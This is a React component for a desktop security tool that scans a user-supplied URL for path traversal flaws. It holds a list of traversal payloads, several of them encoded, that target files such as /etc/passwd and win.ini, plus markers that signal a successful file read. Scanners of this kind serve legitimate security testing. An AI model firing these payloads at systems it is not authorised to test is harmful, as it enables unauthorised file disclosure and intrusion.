import React, { useState } from 'react';
import ToolWrapper from './ToolWrapper';
import styles from './SharedTool.module.css';
import { FileIcon } from '../common/Icons';

interface PathTraversalResult {
  payload: string;
  vulnerable: boolean;
  indicators: string[];
  status: number;
  risk: 'Low' | 'Medium' | 'High' | 'Critical';
}

export const PathTraversalScanner: React.FC = () => {
  const [url, setUrl] = useState('');
  const [results, setResults] = useState<PathTraversalResult[]>([]);
  const [isScanning, setIsScanning] = useState(false);
  const [error, setError] = useState('');

  const pathPayloads = [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\win.ini',
    '....//....//....//etc/passwd',
    '..%2F..%2F..%2Fetc%2Fpasswd',
    '..%252F..%252F..%252Fetc%252Fpasswd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '....\\\\....\\\\....\\\\windows\\\\win.ini',
    '..;/..;/..;/etc/passwd',
    '..//..//..//etc/passwd',
    '/etc/passwd',
    'C:\\windows\\win.ini',
    '/var/www/html/index.php',
  ];

  const pathIndicators = [
    'root:',
    'bin/bash',
    'nobody:',
    '[extensions]',
    '[fonts]',
    '<?php',
    'for 16-bit app support',
  ];

  const scanPathTraversal = async () => {
    if (!url.trim()) {
      setError('Please enter a URL with file parameter (e.g., ?file=test.txt)');
      return;
    }

    try {
      setIsScanning(true);
      setError('');
      setResults([]);

      const testResults: PathTraversalResult[] = [];

      for (const payload of pathPayloads) {
        try {
          const testUrl = url.replace(/=[^&]*/, `=${encodeURIComponent(payload)}`);

          const response = await window.electronAPI.net.httpFetch(testUrl, {
            method: 'GET',
            timeout: 5000,
          });

          const responseData = response.data || '';
          const foundIndicators = pathIndicators.filter((indicator) =>
            responseData.includes(indicator)
          );
          const vulnerable = foundIndicators.length > 0;

          let risk: 'Low' | 'Medium' | 'High' | 'Critical' = 'Low';
          if (vulnerable) {
            if (responseData.includes('root:') || responseData.includes('<?php')) {
              risk = 'Critical';
            } else {
              risk = 'High';
            }
          }

          testResults.push({
            payload,
            vulnerable,
            indicators: foundIndicators,
            status: response.status || 0,
            risk,
          });
        } catch (err) {
          testResults.push({
            payload,
            vulnerable: false,
            indicators: [],
            status: 0,
            risk: 'Low',
          });
        }
      }

      setResults(testResults);
    } catch (err) {
      setError(`Scan error: ${(err as Error).message}`);
    } finally {
      setIsScanning(false);
    }
  };

  const getRiskBadgeClass = (risk: string) => {
    switch (risk) {
      case 'Critical':
        return styles.badgeCritical;
      case 'High':
        return styles.badgeHigh;
      case 'Medium':
        return styles.badgeMedium;
      case 'Low':
        return styles.badgeLow;
      default:
        return styles.badgeNeutral;
    }
  };

  return (
    <ToolWrapper
      title="Path Traversal Scanner"
      icon={<FileIcon />}
      description="Test URLs for path traversal vulnerabilities"
    >
      <div className={styles.section}>
        <div className={styles.inputGroup}>
          <label className={styles.label}>Target URL</label>
          <input
            type="text"
            className={styles.input}
            value={url}
            onChange={(e) => setUrl(e.target.value)}
            placeholder="https://example.com/download?file=test.txt"
            onKeyPress={(e) => e.key === 'Enter' && scanPathTraversal()}
          />
        </div>
        <div style={{ marginTop: '5px', fontSize: '11px', color: 'var(--color-text-tertiary)' }}>
          URL must include a file parameter
        </div>

        <div className={styles.buttonGroup}>
          <button className={styles.primaryBtn} onClick={scanPathTraversal} disabled={isScanning}>
            {isScanning ? 'Scanning...' : 'Scan Path Traversal'}
          </button>
        </div>
      </div>

      {error && <div className={styles.errorBox}>{error}</div>}

      {results.length > 0 && (
        <div className={styles.resultBox}>
          <span className={styles.resultTitle}>
            Scan Results ({results.filter((r) => r.vulnerable).length} vulnerabilities found)
          </span>

          {results
            .filter((r) => r.vulnerable)
            .map((result, idx) => (
              <div
                key={idx}
                className={styles.resultItem}
                style={{
                  borderLeft: `3px solid ${result.risk === 'Critical' ? '#ff0055' : '#ff3366'}`,
                }}
              >
                <div
                  style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '8px' }}
                >
                  <span style={{ fontWeight: 'bold', color: '#ff6b8a' }}>
                    PATH TRAVERSAL VULNERABILITY
                  </span>
                  <span className={`${styles.badge} ${getRiskBadgeClass(result.risk)}`}>
                    {result.risk}
                  </span>
                </div>
                <div className={styles.codeBlock}>Payload: {result.payload}</div>
                <div
                  style={{
                    fontSize: '13px',
                    color: 'var(--color-text-tertiary)',
                    marginBottom: '5px',
                  }}
                >
                  Detected indicators:
                </div>
                {result.indicators.map((indicator, i) => (
                  <div
                    key={i}
                    style={{
                      padding: '4px 8px',
                      background: 'rgba(255, 51, 102, 0.1)',
                      border: '1px solid rgba(255, 51, 102, 0.3)',
                      borderRadius: 'var(--border-radius-sm)',
                      marginBottom: '3px',
                      fontSize: '11px',
                      color: '#ff6b8a',
                    }}
                  >
                    {indicator}
                  </div>
                ))}
              </div>
            ))}

          {results.filter((r) => r.vulnerable).length === 0 && (
            <div className={styles.successBox}>No path traversal vulnerabilities detected</div>
          )}
        </div>
      )}
    </ToolWrapper>
  );
};

export default PathTraversalScanner;
